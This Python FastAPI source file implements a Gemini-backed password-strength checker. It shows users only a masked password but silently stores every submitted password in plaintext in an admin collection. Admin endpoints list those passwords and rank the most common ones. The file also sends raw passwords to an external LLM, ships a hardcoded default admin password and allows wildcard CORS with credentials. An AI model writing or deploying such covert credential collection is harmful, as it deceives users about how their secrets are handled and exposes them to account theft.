from fastapi import FastAPI, HTTPException, Depends, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from pydantic import BaseModel
from pymongo import MongoClient
import os
from datetime import datetime
import uuid
import asyncio
from dotenv import load_dotenv
from google import genai
import secrets

# Load environment variables
load_dotenv()

app = FastAPI()

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# MongoDB connection
MONGO_URL = os.environ.get('MONGO_URL', 'mongodb://localhost:27017/')
client = MongoClient(MONGO_URL)
db = client.password_intelligence
password_analyses = db.password_analyses
admin_logs = db.admin_logs  # New collection for admin-only logs

# Gemini API configuration
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY')

# Admin authentication
security = HTTPBasic()
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'secure_admin_2024!')

def verify_admin(credentials: HTTPBasicCredentials = Depends(security)):
    """Verify admin credentials"""
    correct_username = secrets.compare_digest(credentials.username, ADMIN_USERNAME)
    correct_password = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=401,
            detail="Invalid admin credentials",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username

class PasswordAnalysisRequest(BaseModel):
    password: str
    session_id: str

class PasswordAnalysisResponse(BaseModel):
    analysis_id: str
    password_masked: str
    strength_score: int
    strength_level: str
    weaknesses: list
    crack_time: dict
    suggestions: list
    explanation: str
    timestamp: str

async def log_password_for_admin(password: str, session_id: str, analysis_result: dict, user_ip: str = "unknown"):
    """Log actual password for admin review (admin-only access)"""
    try:
        admin_log = {
            "log_id": str(uuid.uuid4()),
            "actual_password": password,  # Store actual password for admin analysis
            "session_id": session_id,
            "user_ip": user_ip,
            "analysis_result": analysis_result,
            "timestamp": datetime.now().isoformat(),
            "log_type": "password_analysis",
            "security_classification": "admin_only"
        }
        admin_logs.insert_one(admin_log)
    except Exception as e:
        print(f"Error logging password for admin: {e}")

async def analyze_password_with_gemini(password: str, session_id: str) -> dict:
    """Analyze password using Gemini API"""
    try:
        # Initialize the Gemini client
        client = genai.Client(api_key=GEMINI_API_KEY)
        
        # Create analysis prompt
        prompt = f"""You are a cybersecurity expert. Analyze this password: "{password}"

Return ONLY a valid JSON object with this exact structure (no markdown, no additional text):

{{
  "strength_score": 25,
  "strength_level": "weak",
  "weaknesses": ["Too short", "Common dictionary word", "Sequential numbers"],
  "crack_time": {{
    "brute_force": "Seconds",
    "dictionary_attack": "Instant", 
    "rainbow_table": "Instant"
  }},
  "suggestions": ["Use at least 12 characters", "Mix uppercase, lowercase, numbers, symbols", "Avoid dictionary words"],
  "explanation": "This password is weak because it contains common patterns and is easily guessable."
}}

Analyze considering: length, character variety, patterns, dictionary words, predictability.
Score: 0-30=weak, 31-70=moderate, 71-100=strong.
Return only the JSON object."""
        
        # Get response from Gemini
        response = await asyncio.to_thread(
            client.models.generate_content,
            model='gemini-1.5-flash',
            contents=prompt
        )
        
        # Parse the JSON response
        import json
        import re
        try:
            # Extract text from response and clean it
            response_text = response.text.strip()
            
            # Try to extract JSON from response (in case there's extra text)
            json_match = re.search(r'\{.*\}', response_text, re.DOTALL)
            if json_match:
                response_text = json_match.group()
            
            analysis_data = json.loads(response_text)
            
            # Validate required fields
            required_fields = ["strength_score", "strength_level", "weaknesses", "crack_time", "suggestions", "explanation"]
            if all(field in analysis_data for field in required_fields):
                return analysis_data
            else:
                raise ValueError("Missing required fields in response")
                
        except (json.JSONDecodeError, ValueError) as e:
            print(f"JSON/Validation error: {e}")
            # Create a simple analysis based on basic rules
            password_len = len(password)
            has_upper = any(c.isupper() for c in password)
            has_lower = any(c.islower() for c in password)
            has_digit = any(c.isdigit() for c in password)
            has_special = any(not c.isalnum() for c in password)
            
            score = 0
            score += min(password_len * 4, 25)  # Length (max 25)
            score += 15 if has_upper else 0
            score += 15 if has_lower else 0
            score += 15 if has_digit else 0
            score += 30 if has_special else 0
            
            if password_len < 8:
                level = "weak"
            elif score < 60:
                level = "moderate"
            else:
                level = "strong"
            
            weaknesses = []
            if password_len < 8:
                weaknesses.append("Password is too short (less than 8 characters)")
            if not has_upper:
                weaknesses.append("Missing uppercase letters")
            if not has_lower:
                weaknesses.append("Missing lowercase letters")
            if not has_digit:
                weaknesses.append("Missing numbers")
            if not has_special:
                weaknesses.append("Missing special characters")
            if password.lower() in ['password', 'admin', 'user', 'test']:
                weaknesses.append("Uses common dictionary word")
                
            return {
                "strength_score": min(score, 100),
                "strength_level": level,
                "weaknesses": weaknesses,
                "crack_time": {
                    "brute_force": "Seconds" if score < 30 else "Minutes" if score < 60 else "Years",
                    "dictionary_attack": "Instant" if any(word in password.lower() for word in ['password', 'admin', 'user', 'test']) else "Days",
                    "rainbow_table": "Instant" if score < 40 else "Hours"
                },
                "suggestions": [
                    "Use at least 12 characters",
                    "Include uppercase and lowercase letters",
                    "Add numbers and special characters",
                    "Avoid dictionary words",
                    "Use unique passwords for each account"
                ],
                "explanation": f"This password scored {min(score, 100)}/100. It's classified as {level} strength with {len(weaknesses)} identified weaknesses."
            }
    except Exception as e:
        print(f"Error analyzing password: {e}")
        return {
            "strength_score": 0,
            "strength_level": "weak",
            "weaknesses": ["Analysis failed"],
            "crack_time": {
                "brute_force": "Unknown",
                "dictionary_attack": "Unknown", 
                "rainbow_table": "Unknown"
            },
            "suggestions": ["Please try again"],
            "explanation": f"Error occurred during analysis: {str(e)}"
        }

@app.post("/api/analyze-password", response_model=PasswordAnalysisResponse)
async def analyze_password(request: PasswordAnalysisRequest):
    """Analyze password strength using Gemini API"""
    if not GEMINI_API_KEY:
        raise HTTPException(status_code=500, detail="Gemini API key not configured")
    
    if not request.password:
        raise HTTPException(status_code=400, detail="Password is required")
    
    # Analyze password with Gemini
    analysis_data = await analyze_password_with_gemini(request.password, request.session_id)
    
    # Generate analysis ID
    analysis_id = str(uuid.uuid4())
    
    # Mask password for storage (show only first and last char)
    password_masked = f"{request.password[0]}{'*' * (len(request.password) - 2)}{request.password[-1]}" if len(request.password) > 2 else "*" * len(request.password)
    
    # Prepare response
    response_data = {
        "analysis_id": analysis_id,
        "password_masked": password_masked,
        "strength_score": analysis_data.get("strength_score", 0),
        "strength_level": analysis_data.get("strength_level", "weak"),
        "weaknesses": analysis_data.get("weaknesses", []),
        "crack_time": analysis_data.get("crack_time", {}),
        "suggestions": analysis_data.get("suggestions", []),
        "explanation": analysis_data.get("explanation", ""),
        "timestamp": datetime.now().isoformat()
    }
    
    # Log actual password for admin (admin-only access)
    await log_password_for_admin(request.password, request.session_id, response_data)
    
    # Store masked password in regular database for user history
    password_analyses.insert_one({
        "analysis_id": analysis_id,
        "session_id": request.session_id,
        "password_masked": password_masked,  # Only masked password in user-visible DB
        "strength_score": response_data["strength_score"],
        "strength_level": response_data["strength_level"],
        "weaknesses": response_data["weaknesses"],
        "crack_time": response_data["crack_time"],
        "suggestions": response_data["suggestions"],
        "explanation": response_data["explanation"],
        "timestamp": response_data["timestamp"]
    })
    
    return response_data

@app.get("/api/analysis-history/{session_id}")
async def get_analysis_history(session_id: str):
    """Get password analysis history for a session (only shows masked passwords)"""
    try:
        analyses = list(password_analyses.find(
            {"session_id": session_id},
            {"_id": 0}  # Exclude MongoDB _id field
        ).sort("timestamp", -1))
        
        return {"analyses": analyses}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error fetching history: {str(e)}")

@app.get("/api/admin/password-logs")
async def get_admin_password_logs(
    admin: str = Depends(verify_admin),
    limit: int = Query(50, description="Number of logs to retrieve"),
    skip: int = Query(0, description="Number of logs to skip")
):
    """Admin-only endpoint to view actual passwords and analysis logs"""
    try:
        logs = list(admin_logs.find(
            {},
            {"_id": 0}  # Exclude MongoDB _id field
        ).sort("timestamp", -1).skip(skip).limit(limit))
        
        total_count = admin_logs.count_documents({})
        
        return {
            "logs": logs,
            "total_count": total_count,
            "current_page": skip // limit + 1,
            "total_pages": (total_count + limit - 1) // limit
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error fetching admin logs: {str(e)}")

@app.get("/api/admin/password-stats")
async def get_password_stats(admin: str = Depends(verify_admin)):
    """Admin-only endpoint for password analysis statistics"""
    try:
        total_analyses = admin_logs.count_documents({})
        weak_passwords = admin_logs.count_documents({"analysis_result.strength_level": "weak"})
        moderate_passwords = admin_logs.count_documents({"analysis_result.strength_level": "moderate"})
        strong_passwords = admin_logs.count_documents({"analysis_result.strength_level": "strong"})
        
        # Get most common weak patterns
        common_patterns = list(admin_logs.aggregate([
            {"$match": {"analysis_result.strength_level": "weak"}},
            {"$group": {"_id": "$actual_password", "count": {"$sum": 1}}},
            {"$sort": {"count": -1}},
            {"$limit": 10}
        ]))
        
        return {
            "total_analyses": total_analyses,
            "strength_distribution": {
                "weak": weak_passwords,
                "moderate": moderate_passwords,
                "strong": strong_passwords
            },
            "common_weak_patterns": common_patterns
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error fetching stats: {str(e)}")

@app.get("/api/health")
async def health_check():
    """Health check endpoint"""
    gemini_key = os.environ.get('GEMINI_API_KEY')
    return {
        "status": "healthy", 
        "gemini_configured": bool(gemini_key),
        "gemini_key_length": len(gemini_key) if gemini_key else 0
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)